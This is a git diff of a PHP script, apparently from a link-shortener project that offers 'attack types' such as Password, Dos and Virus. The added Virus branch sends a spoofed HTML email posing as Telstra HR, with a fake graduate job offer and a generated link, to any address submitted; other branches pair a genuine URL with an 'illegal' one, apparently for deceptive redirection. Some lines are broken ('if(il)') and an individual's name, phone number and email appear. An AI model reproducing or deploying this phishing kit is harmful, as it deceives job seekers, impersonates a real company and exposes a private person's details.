@@ -2,21 +2,17 @@
 session_start();
 include "../php/DataBaseHandling.php";
 include "../scripts/simple_html_dom.php" ;
-
+include "../php/PHPMailerAutoload.php";
 
 $key = "";
 $conn = openConnection();
 
 $longlink = $_POST['urllink'];
 $typeOfAttack = $_POST['Type'];
-$email = $_POST["email"];
-
-
-
+$address = $_POST["email"];
+$useraddress = $_POST["useremail"];
 $_SESSION['urllink']=$longlink;
 $_SESSION['Type']=$typeOfAttack;
-
-
 
 function createFolderAndFile($key){
   if (!is_dir($key)) {
@@ -33,44 +29,74 @@ function createFolderAndFile($key){
   }
 }
 
-if($typeOfAttack === 'Cryptography'){
-  $illlonglink = $_POST['illurlink'];
+function storingMultipleLinks(){
+    
+}
+
+
+//if($typeOfAttack === 'Cryptography'){
+//  $illlonglink = $_POST['illurlink'];
+//  $_SESSION['illlonglink'] = $illlonglink;
+//  $key = generateKey(6,$key);
+//  $key = checkForDuplicateKeys($key , $conn);
+//  addDataToDatabase($key , $longlink , $conn);
+//  addDataToDatabase($key , $illlonglink , $conn);
+//  $config = array(
+//    "digest_alg" => "sha512",
+//    "private_key_bits" => 4096,
+//    "private_key_type" => OPENSSL_KEYTYPE_RSA,
+//);
+//    $res = openssl_pkey_new($config);
+//  // Get private key
+//  openssl_pkey_export($res, $privkey);
+//
+//  // Get public key
+//  $pubkey = openssl_pkey_get_details($res);
+//  $pubkey=$pubkey["key"];
+//    
+//$subject = 'TOP SECRET';
+//
+//$message = "hello, this is your public key: " .$pubkey;
+//$privatemessage = "hello, this is your private key: " .$privkey;
+//
+//// More headers
+//$headers .= 'From: <stme@example.com>' . "\r\n";
+//mail($address,$subject,$message,$headers);
+//    echo $useraddress;
+//    
+//$userlink = "http://stme.esy.es/".$key."/get.php";
+//
+//openssl_private_encrypt($userlink, $encrypted, $privkey);
+//$userlink = $encrypted;    
+//
+//  createFolderAndFile($key);
+//mail($useraddress,$subject,$privatemessage,$headers);  
+//
+//}
+
+
+
+if($typeOfAttack == "Password"){
+   $illlonglink = $_POST['illurlink'];
   $_SESSION['illlonglink'] = $illlonglink;
   $key = generateKey(6,$key);
   $key = checkForDuplicateKeys($key , $conn);
   addDataToDatabase($key , $longlink , $conn);
   addDataToDatabase($key , $illlonglink , $conn);
-  $res=openssl_pkey_new();
-
-  // Get private key
-  openssl_pkey_export($res, $privkey);
-  $_SESSION['privKey']=$privkey;
-
-  // Get public key
-  $pubkey=openssl_pkey_get_details($res);
-  $pubkey=$pubkey["key"];
-    
-  $to='jaredkoh05@gmail.com';
-  $subject = 'here is your private key';
-  $message = 'hello, this is your private key: '.$privkey;
-  $headers = 'From: illegal@example.com' . "\r\n" .
-             'Reply-To: jaredkoh05@gmail.com' . "\r\n" .
-             'X-Mailer: PHP/' . phpversion();
-
-  mail($to, $subject, $message, $headers);
-
-  $to= $email;
-  $subject = 'here is your key';
-  $message = 'hello, this is your key: '.$pubkey;
-  $headers = 'From: illegal@example.com' . "\r\n" .
-             'X-Mailer: PHP/' . phpversion();
-
-  mail($to, $subject, $message, $headers);
-
-
-  $userlink = "http://stme.esy.es/".$key."/get.php";
   createFolderAndFile($key);
-}
+  $userlink = "http://stme.esy.es/".$key."/get.php";
+ }
+else if($typeOfAttack == "Dos"){
+   $illlonglink = $_POST['illurlink'];
+  $_SESSION['illlonglink'] = $illlonglink;
+  $key = generateKey(6,$key);
+  $key = checkForDuplicateKeys($key , $conn);
+  addDataToDatabase($key , $longlink , $conn);
+  addDataToDatabase($key , $illlonglink , $conn);
+  createFolderAndFile($key);
+  $userlink = "http://stme.esy.es/".$key."/get.php";
+ }
+
 //else if($typeOfAttack ==="Tracking"){
     // $map =    "<div id='map' class='form-control' style='height:500px'></div>";
     //
@@ -95,20 +121,45 @@ else if($typeOfAttack == "Affliate"){
 
   }
 }
+else if($typeOfAttack == "Virus"){
+     $key = generateKey(6,$key);
+  $key = checkForDuplicateKeys($key , $conn);
+  addDataToDatabase($key , $longlink , $conn);
+    createFolderAndFile($key);
+
+  // More headers
+    $headers .= 'From: <TelstraCareers@team-telstra.com>' . "\r\n";
+    $headers .= "MIME-Version: 1.0" . "\n";
+    $headers .= "Content-type:text/html;charset=iso-8859-1" . "\n";
+    $myAttachment = chunk_split(base64_encode(file_get_contents( "http://stme.esy.es/imgs/telstralogo.png")));
+  $message .= '<html><body>';
+    $message .= '<img src="http://stme.esy.es/imgs/telstralogo.png">';
+    $message .= '<p><br/>Dear Applicant</b></p>'; 
+    $message .= '<p><br/>We are very pleased to offer you the position of Graduate, on a full time basis, commencing August 31st 2016 as part of Telstra Graduate Program.</b></p>'; 
+    $message .= '<p><br/>Please accept my congratulations on your success at being selected for this job. I would also like to thank you for considering Telstra as a company for which you would like to work.  The success of an organisation depends very much on its most important asset - its people - and I am sure that should you accept the offer you will enjoy contributing to and being a part of Telstra success.  </b></p>'; 
+    $message .= '<p><br/> Your total remuneration (salary inclusive of CPF) is: $50,000 AUD</b></p>';
+    $message .= '<p><br/>Please go through the contract which is attached to this email.</b></p>'; 
+    $message .= '<p><br/> Please call or email Jared 07524235103 if you have any questions and also to confirm that you are accepting Telstra offer by 5pm Tuesday the 7th of June. Subject to this acceptance by you, a written agreement will be sent, which will provide further details of your terms and conditions of employment. </b></p>'; 
+    $message .= '<p><br/>Once again, congratulations on your selection and I welcome you to the Telstra Graduate Program.</b></p>'; 
+    $message .= '<p><br/>Kind regards,</b></p>'; 
+    $message .= '<p><br/>Jared Koh</b></p>'; 
+    $message .= '<p><br/>Graduate Program Manager</b></p>'; 
+    $message .= '<p><br/>Telstra HR</b></p>'; 
+    $message .= '</body></html>';
+    $subject = 'Graduate Letter of Offer';
+    mail($address,$subject,$message,$headers);
+    
+    $userlink = "http://stme.esy.es/".$key."/get.php";
+    
+}
 else{
-  $key = checkForDuplicateLinks($longlink,$conn);
-  if(is_null($key)===TRUE){
     $key = generateKey(6,$key);
     $key = checkForDuplicateKeys($key , $conn);
     addDataToDatabase($key , $longlink , $conn);
+    if(il)
     $userlink = "http://stme.esy.es/".$key."/get.php";
     createFolderAndFile($key);
   }
-  else{
-    $userlink = "http://stme.esy.es/".$key."/get.php";
-  }
-}
-
 $conn->close(); ?>
 
 
@@ -132,8 +183,8 @@ $conn->close(); ?>
     <h1> Thanks For Using :) </h1>
     <button type="button" class="btn btn-success" style="float:right" id="go">Go</button>
     <div style="overflow: hidden; padding-right: .5em;">
-      <input type="url" class="form-control" name="urllink" id="form" value=<?php echo $userlink ?>></input>
-    </div>​
+        <input type="url" class="form-control" name="urllink" id="form" value="<?php echo $userlink ?>"/>
+    </div>
 
   </div>
   <div class ="videobackground">
@@ -146,6 +197,5 @@ $conn->close(); ?>
     </div>
   </div>
 
-  </script>
 </body>
 </html>
